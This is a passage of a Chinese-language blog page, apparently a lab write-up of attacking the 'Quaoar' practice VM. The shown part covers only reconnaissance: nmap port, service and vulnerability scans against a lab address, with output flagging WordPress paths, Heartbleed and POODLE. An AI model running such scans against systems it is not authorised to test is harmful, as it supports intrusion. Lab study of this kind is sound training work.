@@ -1,0 +1,697 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Quaoar信息收集123456789101112131415161718┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;Quaoar]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.145                                                          [sudo] password for k">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Quaoar 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/09/0986fb84a8d0.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Quaoar信息收集123456789101112131415161718┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;Quaoar]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.145                                                          [sudo] password for k">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/653421b2b6905dd550b0bb2089b8d15c_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/41d51433d203b513390826e1c5d81db9_MD5.png">
+<meta property="article:published_time" content="2023-09-24T07:51:15.000Z">
+<meta property="article:modified_time" content="2023-09-24T09:10:23.963Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/653421b2b6905dd550b0bb2089b8d15c_MD5.png">
+  
+  
+  
+  <title>Quaoar 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Quaoar 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-24 15:51" pubdate>
+          2023年9月24日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          27k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          224 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Quaoar 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Quaoar"><a href="#Quaoar" class="headerlink" title="Quaoar"></a>Quaoar</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.145                                                          <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 02:58 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.145<br>Host is up (0.00022s latency).<br>Not shown: 65526 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br>993/tcp open  imaps<br>995/tcp open  pop3s<br>MAC Address: 08:00:27:A6:AE:F1 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>
+
+<p>一如既往这么多端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo nmap -sT -sV -sC -O -p22,53,80,110,139,143,445,993,995 192.168.56.145               <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 02:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.145<br>Host is up (0.00033s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)<br>|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:<span class="hljs-built_in">cd</span>:f1:5e:dc (RSA)<br>|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)<br>53/tcp  open  domain      ISC BIND 9.8.1-P1<br>| dns-nsid: <br>|_  bind.version: 9.8.1-P1<br>80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))<br>| http-robots.txt: 1 disallowed entry <br>|_Hackers<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="hljs-string">110/tcp open  pop3        Dovecot pop3d</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T04:32:43</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T04:32:43</span><br><span class="hljs-string">|_ssl-date: 2023-09-23T15:00:18+00:00; +7h59m59s from scanner time.</span><br><span class="hljs-string">|_pop3-capabilities: PIPELINING STLS RESP-CODES SASL TOP UIDL CAPA</span><br><span class="hljs-string">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="hljs-string">143/tcp open  imap        Dovecot imapd</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T04:32:43</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T04:32:43</span><br><span class="hljs-string">|_imap-capabilities: listed LOGIN-REFERRALS capabilities LITERAL+ ENABLE IMAP4rev1 IDLE OK have STARTTLS post-login Pre-login LOGINDISABLEDA0001 SASL-IR more ID</span><br><span class="hljs-string">|_ssl-date: 2023-09-23T15:00:18+00:00; +7h59m58s from scanner time.</span><br><span class="hljs-string">445/tcp open              Samba smbd 3.6.3 (workgroup: WORKGROUP)</span><br><span class="hljs-string">993/tcp open  ssl/imap    Dovecot imapd</span><br><span class="hljs-string">|_imap-capabilities: listed capabilities LITERAL+ ENABLE IMAP4rev1 IDLE AUTH=PLAINA0001 LOGIN-REFERRALS have post-login Pre-login OK SASL-IR more ID</span><br><span class="hljs-string">|_ssl-date: 2023-09-23T15:00:19+00:00; +7h59m59s from scanner time.</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T04:32:43</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T04:32:43</span><br><span class="hljs-string">995/tcp open  ssl/pop3    Dovecot pop3d</span><br><span class="hljs-string">|_pop3-capabilities: PIPELINING CAPA RESP-CODES SASL(PLAIN) TOP UIDL USER</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T04:32:43</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T04:32:43</span><br><span class="hljs-string">|_ssl-date: 2023-09-23T15:00:19+00:00; +7h59m59s from scanner time.</span><br><span class="hljs-string">MAC Address: 08:00:27:A6:AE:F1 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 2.6.X|3.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br><span class="hljs-string">OS details: Linux 2.6.32 - 3.5</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Unix (Samba 3.6.3)</span><br><span class="hljs-string">|   NetBIOS computer name: </span><br><span class="hljs-string">|   Workgroup: WORKGROUP\x00</span><br><span class="hljs-string">|_  System time: 2023-09-23T11:00:09-04:00</span><br><span class="hljs-string">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="hljs-string">|_clock-skew: mean: 8h39m58s, deviation: 1h37m58s, median: 7h59m58s</span><br><span class="hljs-string">|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br></code></pre></td></tr></table></figure>
+
+<p>Ubuntu 操作系统，wordpress 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo nmap --script=vuln -p22,53,80,110,139,143,445,993,995 192.168.56.145               <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 03:03 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.145<br>Host is up (0.00026s latency).<br><br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|   /wordpress/: Blog<br>|   /robots.txt: Robots file<br>|   /wordpress/wp-login.php: Wordpress login page.<br>|_  /upload/: Potentially interesting folder<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">110/tcp open  pop3</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">| ssl-heartbleed: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="hljs-string">|_      http://cvedetails.com/cve/2014-0160/</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">139/tcp open  netbios-ssn</span><br><span class="hljs-string">143/tcp open  imap</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span 